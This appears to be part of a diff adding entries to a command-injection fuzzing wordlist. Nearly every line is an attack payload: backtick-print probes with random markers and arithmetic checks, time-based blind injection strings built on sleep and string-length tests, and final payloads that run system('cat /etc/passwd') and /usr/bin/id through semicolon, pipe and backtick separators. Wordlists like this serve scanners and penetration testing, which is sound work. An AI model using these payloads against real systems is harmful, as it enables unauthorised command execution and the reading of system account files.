+");}print(`echo NAAXBX`.`echo $((38+13))`.`echo NAAXBX`.`echo NAAXBX`);NAAXBX
+")print(`echo NBPPTV\necho $((1+63))\necho NBPPTV\necho NBPPTV`);%25255C%25255CNBPPTV
+')print(`echo NFASEM`.`echo $((28+31))`.`echo NFASEM`.`echo NFASEM`);//NFASEM
+)print(`echo NLOFKT\necho $((26+86))\necho NLOFKT\necho NLOFKT`);%25255C%25255CNLOFKT
+)print(`echo NNYPSL`.`echo $((56+33))`.`echo NNYPSL`.`echo NNYPSL`);.'NNYPSL
+');}print(`echo NPFNRM;echo $((91+52));echo NPFNRM;echo NPFNRM`);\\NPFNRM
+print(`echo NSKJQW;echo $((41+11));echo NSKJQW;echo NSKJQW`);."NSKJQW
+");}print(`echo NUVVKA;echo $((27+5));echo NUVVKA;echo NUVVKA`);)}NUVVKA
+'.print(`echo NXDUHQ%0aecho $((28+78))%0aecho NXDUHQ%0aecho NXDUHQ`);NXDUHQ
+')print(`echo OFKEZB;echo $((35+78));echo OFKEZB;echo OFKEZB`);#OFKEZB
+print(`echo OKEJJB%0aecho $((46+60))%0aecho OKEJJB%0aecho OKEJJB`);OKEJJB
+print(`echo OSGUGU`.`echo $((64+8))`.`echo OSGUGU`.`echo OSGUGU`);//OSGUGU
+);}print(`echo OSKSTF%0aecho $((2+12))%0aecho OSKSTF%0aecho OSKSTF`);.%2527OSKSTF
+")print(`echo OTTCBX;echo $((64+75));echo OTTCBX;echo OTTCBX`);OTTCBX
+")print(`echo OVQSQG%0aecho $((8+36))%0aecho OVQSQG%0aecho OVQSQG`);//OVQSQG
+')print(`echo OXDDYE\necho $((75+92))\necho OXDDYE\necho OXDDYE`);%25255C%25255COXDDYE
+")print(`echo OZMQFI`.`echo $((35+9))`.`echo OZMQFI`.`echo OZMQFI`);//OZMQFI
+'.print(`echo PFJGQM%0aecho $((86+33))%0aecho PFJGQM%0aecho PFJGQM`);%2529%257DPFJGQM
+print(`echo PFLDED;echo $((95+99));echo PFLDED;echo PFLDED`);.'PFLDED
+")print(`echo PHKGWS\necho $((9+71))\necho PHKGWS\necho PHKGWS`);PHKGWS
+);}print(`echo PJRPBN\necho $((21+16))\necho PJRPBN\necho PJRPBN`);PJRPBN
+')print(`echo PMUZEH%0aecho $((73+89))%0aecho PMUZEH%0aecho PMUZEH`);.%2527PMUZEH
+".print(`echo POVQEX`.`echo $((96+65))`.`echo POVQEX`.`echo POVQEX`);#POVQEX
+")print(`echo PPZHBZ%0aecho $((86+40))%0aecho PPZHBZ%0aecho PPZHBZ`);PPZHBZ
+)print(`echo PUEXZN`.`echo $((11+4))`.`echo PUEXZN`.`echo PUEXZN`);//PUEXZN
+')print(`echo PWUTCR`.`echo $((0+3))`.`echo PWUTCR`.`echo PWUTCR`);#PWUTCR
+".print(`echo PZAGMU\necho $((23+82))\necho PZAGMU\necho PZAGMU`);%25255C%25255CPZAGMU
+)print(`echo QADPCR;echo $((51+16));echo QADPCR;echo QADPCR`);)}QADPCR
+print(`echo QGZDYY%0aecho $((26+56))%0aecho QGZDYY%0aecho QGZDYY`);%255C%255CQGZDYY
+");}print(`echo QHWLWM`.`echo $((41+28))`.`echo QHWLWM`.`echo QHWLWM`);\\QHWLWM
+'.print(`echo QLKXYP;echo $((79+46));echo QLKXYP;echo QLKXYP`);\\QLKXYP
+");}print(`echo QNFOEE%0aecho $((91+41))%0aecho QNFOEE%0aecho QNFOEE`);%2529%257DQNFOEE
+)print(`echo QQGYPS`.`echo $((10+39))`.`echo QQGYPS`.`echo QQGYPS`);\\QQGYPS
+')print(`echo QTJEKD\necho $((90+98))\necho QTJEKD\necho QTJEKD`);.%252527QTJEKD
+")print(`echo QZFGHE`.`echo $((4+60))`.`echo QZFGHE`.`echo QZFGHE`);.'QZFGHE
+");}print(`echo RACXOI`.`echo $((81+11))`.`echo RACXOI`.`echo RACXOI`);#RACXOI
+'print(`echo RAZRYE;echo $((84+60));echo RAZRYE;echo RAZRYE`);\\RAZRYE
+'.print(`echo RDHTSN`.`echo $((90+44))`.`echo RDHTSN`.`echo RDHTSN`);.'RDHTSN
+");}print(`echo RKXNWH%0aecho $((63+75))%0aecho RKXNWH%0aecho RKXNWH`);.%2527RKXNWH
+');}print(`echo RNSTSU;echo $((52+2));echo RNSTSU;echo RNSTSU`);RNSTSU
+")print(`echo RPOOHR%0aecho $((72+27))%0aecho RPOOHR%0aecho RPOOHR`);%2523RPOOHR
+print(`echo RREYBJ`.`echo $((33+25))`.`echo RREYBJ`.`echo RREYBJ`);.'RREYBJ
+'print(`echo RRMVOG;echo $((30+37));echo RRMVOG;echo RRMVOG`);)}RRMVOG
+')print(`echo RUXOHA`.`echo $((74+92))`.`echo RUXOHA`.`echo RUXOHA`))}RUXOHA
+".print(`echo RVELEJ;echo $((74+30));echo RVELEJ;echo RVELEJ`);\\RVELEJ
+");}print(`echo RXUKTF\necho $((42+2))\necho RXUKTF\necho RXUKTF`);.%252527RXUKTF
+".print(`echo RZWFMA`.`echo $((75+86))`.`echo RZWFMA`.`echo RZWFMA`);\\RZWFMA
+')print(`echo SATCYU`.`echo $((51+26))`.`echo SATCYU`.`echo SATCYU`);\\SATCYU
+);}print(`echo SCGPHN%0aecho $((41+99))%0aecho SCGPHN%0aecho SCGPHN`);%2529%257DSCGPHN
+");}print(`echo SFBDLE\necho $((73+49))\necho SFBDLE\necho SFBDLE`);%252529%25257DSFBDLE
+")print(`echo SGRKCG`.`echo $((91+4))`.`echo SGRKCG`.`echo SGRKCG`);."SGRKCG
+'.print(`echo SMJBZB%0aecho $((19+71))%0aecho SMJBZB%0aecho SMJBZB`);//SMJBZB
+")print(`echo SPKTID;echo $((50+54));echo SPKTID;echo SPKTID`);."SPKTID
+")print(`echo SPTGKB`.`echo $((57+66))`.`echo SPTGKB`.`echo SPTGKB`))}SPTGKB
+)print(`echo SQLMHW;echo $((75+6));echo SQLMHW;echo SQLMHW`);."SQLMHW
+'print(`echo STJAIG%0aecho $((89+81))%0aecho STJAIG%0aecho STJAIG`);//STJAIG
+');}print(`echo SVXVYZ`.`echo $((35+1))`.`echo SVXVYZ`.`echo SVXVYZ`))}SVXVYZ
+);}print(`echo SWQEIO\necho $((64+42))\necho SWQEIO\necho SWQEIO`);%25255C%25255CSWQEIO
+)print(`echo SYVAYV%0aecho $((36+49))%0aecho SYVAYV%0aecho SYVAYV`);//SYVAYV
+');}print(`echo TBZBGJ`.`echo $((58+75))`.`echo TBZBGJ`.`echo TBZBGJ`);\\TBZBGJ
+");}print(`echo TCCEGQ`.`echo $((87+34))`.`echo TCCEGQ`.`echo TCCEGQ`))}TCCEGQ
+');}print(`echo TFOYWK;echo $((13+51));echo TFOYWK;echo TFOYWK`);)}TFOYWK
+');}print(`echo TJELNR%0aecho $((81+0))%0aecho TJELNR%0aecho TJELNR`);.%2527TJELNR
+'print(`echo TPBMFF%0aecho $((79+13))%0aecho TPBMFF%0aecho TPBMFF`);%2523TPBMFF
+'.print(`echo TSTIED;echo $((94+6));echo TSTIED;echo TSTIED`);)}TSTIED
+'print(`echo TUDOUK;echo $((63+88));echo TUDOUK;echo TUDOUK`);TUDOUK
+print(`echo TVCCND%0aecho $((62+6))%0aecho TVCCND%0aecho TVCCND`);.%2527TVCCND
+");}print(`echo TWEYRU;echo $((57+60));echo TWEYRU;echo TWEYRU`);TWEYRU
+')print(`echo TYAJKR`.`echo $((73+69))`.`echo TYAJKR`.`echo TYAJKR`);.'TYAJKR
+print(`echo UBBYNF%0aecho $((67+26))%0aecho UBBYNF%0aecho UBBYNF`);%2523UBBYNF
+".print(`echo UCUISA;echo $((65+31));echo UCUISA;echo UCUISA`);UCUISA
+)print(`echo UDBRRF%0aecho $((39+57))%0aecho UDBRRF%0aecho UDBRRF`);%255C%255CUDBRRF
+'print(`echo UDOCFL\necho $((86+7))\necho UDOCFL\necho UDOCFL`);.%252522UDOCFL
+".print(`echo UFRBLO%0aecho $((1+17))%0aecho UFRBLO%0aecho UFRBLO`);%2529%257DUFRBLO
+");}print(`echo UHQKLI`.`echo $((50+4))`.`echo UHQKLI`.`echo UHQKLI`);.'UHQKLI
+")print(`echo UKYEKY\necho $((70+74))\necho UKYEKY\necho UKYEKY`);%252523UKYEKY
+".print(`echo ULLCKQ\necho $((63+14))\necho ULLCKQ\necho ULLCKQ`);%252523ULLCKQ
+")print(`echo ULOIOS\necho $((51+30))\necho ULOIOS\necho ULOIOS`);//ULOIOS
+'.print(`echo ULZFRM`.`echo $((96+62))`.`echo ULZFRM`.`echo ULZFRM`);."ULZFRM
+'print(`echo UPGYTK;echo $((49+93));echo UPGYTK;echo UPGYTK`);."UPGYTK
+');}print(`echo URYEKO`.`echo $((45+57))`.`echo URYEKO`.`echo URYEKO`);#URYEKO
+);}print(`echo UTBTBN;echo $((92+40));echo UTBTBN;echo UTBTBN`);UTBTBN
+");}print(`echo UTFROF\necho $((67+6))\necho UTFROF\necho UTFROF`);//UTFROF
+');}print(`echo UXXDJD\necho $((17+17))\necho UXXDJD\necho UXXDJD`);.%252522UXXDJD
+');}print(`echo VBLUSZ%0aecho $((96+95))%0aecho VBLUSZ%0aecho VBLUSZ`);//VBLUSZ
+')print(`echo VEMMAU;echo $((59+39));echo VEMMAU;echo VEMMAU`);)}VEMMAU
+".print(`echo VFIBZQ;echo $((31+85));echo VFIBZQ;echo VFIBZQ`);.'VFIBZQ
+')print(`echo VHLBFA\necho $((78+60))\necho VHLBFA\necho VHLBFA`);%252529%25257DVHLBFA
+)print(`echo VIVSXO;echo $((60+28));echo VIVSXO;echo VIVSXO`);VIVSXO
+')print(`echo VPYMWX%0aecho $((10+22))%0aecho VPYMWX%0aecho VPYMWX`);%255C%255CVPYMWX
+')print(`echo VRYZVO`.`echo $((19+54))`.`echo VRYZVO`.`echo VRYZVO`);."VRYZVO
+'.print(`echo VWGDMS`.`echo $((77+11))`.`echo VWGDMS`.`echo VWGDMS`);#VWGDMS
+)print(`echo VWOEOC`.`echo $((97+4))`.`echo VWOEOC`.`echo VWOEOC`);VWOEOC
+'.print(`echo VXYNWW\necho $((29+16))\necho VXYNWW\necho VXYNWW`);%25255C%25255CVXYNWW
+");}print(`echo WCABAY%0aecho $((46+3))%0aecho WCABAY%0aecho WCABAY`);WCABAY
+'print(`echo WCPHMV\necho $((3+88))\necho WCPHMV\necho WCPHMV`);%252523WCPHMV
+".print(`echo WKFYWT%0aecho $((57+28))%0aecho WKFYWT%0aecho WKFYWT`);//WKFYWT
+'.print(`echo WMQCVY;echo $((96+95));echo WMQCVY;echo WMQCVY`);.'WMQCVY
+");}print(`echo WQBRFD;echo $((85+53));echo WQBRFD;echo WQBRFD`);\\WQBRFD
+print(`echo WQMIIN`.`echo $((36+90))`.`echo WQMIIN`.`echo WQMIIN`);."WQMIIN
+'print(`echo WSILLK\necho $((70+70))\necho WSILLK\necho WSILLK`);%25255C%25255CWSILLK
+')print(`echo WUCPEY%0aecho $((63+16))%0aecho WUCPEY%0aecho WUCPEY`);%2523WUCPEY
+);}print(`echo WVNNUB%0aecho $((6+67))%0aecho WVNNUB%0aecho WVNNUB`);//WVNNUB
+print(`echo WZLIFQ`.`echo $((3+42))`.`echo WZLIFQ`.`echo WZLIFQ`))}WZLIFQ
+);}print(`echo WZOXHV`.`echo $((36+81))`.`echo WZOXHV`.`echo WZOXHV`);WZOXHV
+".print(`echo XBJBDE`.`echo $((48+93))`.`echo XBJBDE`.`echo XBJBDE`);//XBJBDE
+")print(`echo XCIHWH%0aecho $((57+90))%0aecho XCIHWH%0aecho XCIHWH`);.%2522XCIHWH
+print(`echo XEMHBO%0aecho $((11+24))%0aecho XEMHBO%0aecho XEMHBO`);//XEMHBO
+");}print(`echo XILSBL\necho $((74+71))\necho XILSBL\necho XILSBL`);%25255C%25255CXILSBL
+".print(`echo XKLFAP%0aecho $((76+43))%0aecho XKLFAP%0aecho XKLFAP`);.%2527XKLFAP
+);}print(`echo XMVWXQ%0aecho $((48+88))%0aecho XMVWXQ%0aecho XMVWXQ`);%255C%255CXMVWXQ
+')print(`echo XQTSKO\necho $((61+71))\necho XQTSKO\necho XQTSKO`);.%252522XQTSKO
+');}print(`echo XREPUI`.`echo $((55+99))`.`echo XREPUI`.`echo XREPUI`);//XREPUI
+print(`echo XWPSAV%0aecho $((22+11))%0aecho XWPSAV%0aecho XWPSAV`);%2529%257DXWPSAV
+'.print(`echo XYCPFN\necho $((60+62))\necho XYCPFN\necho XYCPFN`);XYCPFN
+");}print(`echo XYXNLP\necho $((64+13))\necho XYXNLP\necho XYXNLP`);XYXNLP
+'.print(`echo YBQGFX%0aecho $((90+18))%0aecho YBQGFX%0aecho YBQGFX`);%2523YBQGFX
+");}print(`echo YDWEZS;echo $((87+70));echo YDWEZS;echo YDWEZS`);//YDWEZS
+');}print(`echo YERJDV`.`echo $((3+37))`.`echo YERJDV`.`echo YERJDV`);YERJDV
+)print(`echo YIXKKR;echo $((83+25));echo YIXKKR;echo YIXKKR`);.'YIXKKR
+)print(`echo YKQUFP\necho $((94+91))\necho YKQUFP\necho YKQUFP`);.%252522YKQUFP
+");}print(`echo YSGCAB%0aecho $((76+3))%0aecho YSGCAB%0aecho YSGCAB`);%2523YSGCAB
+');}print(`echo YXZEEF;echo $((79+80));echo YXZEEF;echo YXZEEF`);.'YXZEEF
+print(`echo ZHAWPM;echo $((18+57));echo ZHAWPM;echo ZHAWPM`);)}ZHAWPM
+".print(`echo ZLVKDU`.`echo $((0+22))`.`echo ZLVKDU`.`echo ZLVKDU`))}ZLVKDU
+".print(`echo ZTFYUM%0aecho $((56+81))%0aecho ZTFYUM%0aecho ZTFYUM`);.%2522ZTFYUM
+);}print(`echo ZXKKBW\necho $((18+93))\necho ZXKKBW\necho ZXKKBW`);%252523ZXKKBW
+"& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\
+& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\
+'& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\
+"& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 
+& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 
+'& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 
+"& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 '
+& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 '
+'& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 '
+"& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &
+& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &
+'& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &
+"& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |
+& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |
+'& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |
+"& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 "
+& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 "
+'& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 "
+"& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //
+& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //
+'& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //
+"& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #
+& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #
+'& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #
+"; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |
+'; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |
+; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |
+"; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #
+'; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #
+; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #
+"; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //
+'; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //
+; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //
+"; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\
+'; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\
+; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\
+"; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi '
+'; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi '
+; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi '
+"; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &
+'; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &
+; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &
+"; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi 
+'; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi 
+; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi 
+"; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi "
+'; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi "
+; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi "
+;system('cat /etc/passwd')
+system('cat /etc/passwd');
+;system('id')
+;system('/usr/bin/id')
+;|/usr/bin/id|
+`/usr/bin/id`
+|/usr/bin/id
+|/usr/bin/id|
+||/usr/bin/id;
+||/usr/bin/id|
+;/usr/bin/id\n
+|usr/bin/id\n
